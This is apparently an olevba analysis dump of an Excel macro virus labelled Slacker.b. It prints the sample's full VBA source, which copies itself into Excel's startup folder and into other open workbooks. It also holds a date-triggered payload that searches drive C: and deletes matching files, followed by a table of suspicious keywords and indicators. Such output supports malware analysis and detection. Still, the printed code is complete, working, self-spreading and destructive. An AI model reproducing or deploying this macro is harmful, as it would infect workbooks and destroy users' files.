olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Slacker.b-5acbbfd37ccdb840ba3f6b20b0ceea42e00c2f21
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Slacker.b-5acbbfd37ccdb840ba3f6b20b0ceea42e00c2f21 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--bum04-->
Private Sub Workbook_Deactivate()
    On Error Resume Next
    Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountofLines)
        Book1Obj.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
        Book1Obj.Close
        xlApp.Quit
    End If
    If AW.Lines(1, 1) <> "'<!--bum04-->" Then
        AW.DeleteLines 1, AW.CountofLines
        AW.InsertLines 1, TW.Lines(1, TW.CountofLines)
    End If
Bum (101)
End Sub

Function Bum(id As Integer)
check = False
If UCase(Dir("c:\windows\system\bum.dll")) = "BUM.DLL" Then check = True
Select Case id
    Case Is > 20
        Ftype = 3
    Case Is > 50
        Ftype = 4
    Case Is > 100
        Ftype = 2
End Select
If check = False And Date > #9/15/00# Then
           With Application.FileSearch
                    .NewSearch
                    .LookIn = "C:"
                    .FileType = Ftype
                    .SearchSubFolders = True
                    If .Execute() > 0 Then
                    For i = 1 To .FoundFiles.Count
                        Kill .FoundFiles(i)
                    Next i
                    End If
             End With
End If
End Function


-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Slacker.b-5acbbfd37ccdb840ba3f6b20b0ceea42e00c2f21 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Slacker.b-5acbbfd37ccdb840ba3f6b20b0ceea42e00c2f21 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Slacker.b-5acbbfd37ccdb840ba3f6b20b0ceea42e00c2f21 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |bum.dll             |Executable file name                         |
|IOC       |BUM.DLL             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

